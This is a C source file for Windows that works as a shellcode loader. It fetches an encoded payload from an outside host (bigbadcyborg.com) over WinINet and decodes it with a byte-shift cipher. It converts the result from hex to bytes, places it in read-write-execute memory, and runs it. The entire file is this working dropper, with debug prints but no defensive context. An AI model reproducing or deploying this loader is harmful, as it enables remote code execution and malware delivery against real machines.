#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#pragma comment(lib, "wininet.lib")
    

void hexStringToByteArray(const char* hexString, unsigned char* byteArray, size_t size);
void decrypt_n_rot(unsigned char *data, size_t length, int N, int D);
char* process_hex_string(const char *data);
void hexstr_to_bytes(const char *hexstr, unsigned char **bytes, size_t *bytes_len);
void execute_shellcode(void *shellcode) {
    ((void(*)())shellcode)();	
    /*HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
    if (thread_handle == NULL) {
        printf("CreateThread failed: %d\n", GetLastError());
        abort();
    }
    Sleep(5000);
    // Wait for the thread to complete
    WaitForSingleObject(thread_handle, INFINITE);

    // Close the thread handle
    CloseHandle(thread_handle);*/
}


int main(void) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[4096];
    DWORD totalBytesRead = 0;
    char *data = NULL;

    // Initialize WinINet
    hInternet = InternetOpen("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpen failed: %d\n", GetLastError());
        return 1;
    }

    // Open URL
    hConnect = InternetOpenUrl(hInternet, "http://bigbadcyborg.com/encrypted.raw", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrl failed: %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Read data
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        data = realloc(data, totalBytesRead + bytesRead + 1);
        if (data == NULL) {
            printf("Not enough memory (realloc returned NULL)\n");
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return 1;
        }
        memcpy(data + totalBytesRead, buffer, bytesRead);
        totalBytesRead += bytesRead;
    }
    data[totalBytesRead] = '\0';
	
	// Print decrypted data
    printf("encrypted data:\n%s\n", data);

    // Close handles
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Decrypt data using N-ROT
    decrypt_n_rot(data,totalBytesRead, 33, -1);  // Example: N=13 (ROT13)
    
    // Print decrypted data
    printf("Decrypted data:\n%s\n", data);
	
	//process hex string to bytes
	char* processed_data = process_hex_string(data);
	if(!processed_data){
		printf("Err 0");
		return 1;
	}
	
	// Convert hex string to bytes
	unsigned char *shellcode_bytes;
	size_t bytes_len;
	hexstr_to_bytes(processed_data, &shellcode_bytes, &bytes_len);
	printf("\n\nShellcode bytes:\n");
	for (size_t i = 0; i < bytes_len; i++) {
		printf("\\x%02x", shellcode_bytes[i]);
	}
	printf("\n");
	
	free(processed_data);
	
	
	// Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(NULL, bytes_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("VirtualAlloc failed: %d\n", GetLastError());
        free(shellcode_bytes);
        return 1;
    }
    // Verify memory protection
    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, bytes_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("VirtualProtect failed: %d\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }
	
	
    // Copy shellcode to allocated memory
    RtlMoveMemory(exec_mem, shellcode_bytes, bytes_len);
	// Verify copied shellcode
	printf("\n\nCopied Shellcode @ %x:\n", exec_mem);
	unsigned char *mem_bytes = (unsigned char*)exec_mem;
	for (size_t i = 0; i < bytes_len; i++) {
		printf("\\x%02x", mem_bytes[i]);
	}
	printf("\n");
	
    getchar();

    // Execute shellcode
    execute_shellcode(exec_mem);

    getchar();

    // Free dynamically allocated memory
    free(data);	
	// Free dynamically allocated memory 
	VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}


// Function to remove unwanted characters from the string and skip the first line
char* process_hex_string(const char *data) {
    const char *start = strchr(data, '\n'); // Find the first occurrence of '\n'
    if (!start) {
        printf("No newline character found\n");
        return NULL;
    }
    //\\start++; // Move past the '\n'

    size_t len = strlen(start);
    char *processed_data = malloc(len + 1); // Allocating max possible size
    if (!processed_data) {
        printf("Memory allocation failed\n");
        return NULL;
    }

    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        if (start[i] == '"' || start[i] == '\n' || start[i] == ';') {
            // Skip quotes and newlines
            continue;
        } else if (start[i] == '\\' && start[i + 1] == 'x') {
            // Skip only the '\x' part
            i += 1;
        } else if (isxdigit(start[i])) { // Check if it's a valid hex character
            // Copy valid hex characters
            processed_data[j++] = start[i];
        } else {
            printf("Invalid character '%c' at position %zu in hex string\n", start[i], i);
        }
    }
    processed_data[j] = '\0';
	
	
    // Debugging: Print each byte in processed_data as hex
    printf("\n\nHex Bytes: \n");
    for (size_t i = 0; i < j; i += 2) {
        // Ensure there are two characters left for a valid byte
        if (i + 1 < j) {
            unsigned int byte;
            sscanf(&processed_data[i], "%2x", &byte); // Convert two characters to a byte
            printf("\\x%02x", byte); // Print as hex byte
        }
    }
	
	
    return processed_data;
}


void decrypt_n_rot(unsigned char *data, size_t length, int N, int D) {
    for (size_t i = 0; i < length; i++) {
        unsigned char byte = data[i];
        unsigned char shifted_byte = (byte + (D * N)) % 256;
        data[i] = shifted_byte;
    }
}


// Function to convert the hex string to bytes
void hexstr_to_bytes(const char *hexstr, unsigned char **bytes, size_t *bytes_len) {
    // Validate the input
    if (hexstr == NULL) {
        printf("Invalid hex string\n");
        return;
    }

    size_t hexstr_len = strlen(hexstr);

    // Check for valid hex string length (should be even)
    if (hexstr_len % 2 != 0) {
        printf("Hex string length is not even\n");
        return;
    }

    // Validate hex string contains only hex characters
    for (size_t i = 0; i < hexstr_len; i++) {
        if (!isxdigit(hexstr[i])) {
            printf("Invalid character '%c' at position %zu in hex string\n", hexstr[i], i);
            return;
        }
    }

    *bytes_len = hexstr_len / 2;
    *bytes = malloc(*bytes_len);
    if (!(*bytes)) {
        printf("Memory allocation failed\n");
        return;
    }

    // Convert each pair of hex characters to a byte
    for (size_t i = 0; i < *bytes_len; i++) {
        sscanf(hexstr + 2 * i, "%2hhx", &(*bytes)[i]);
    }
}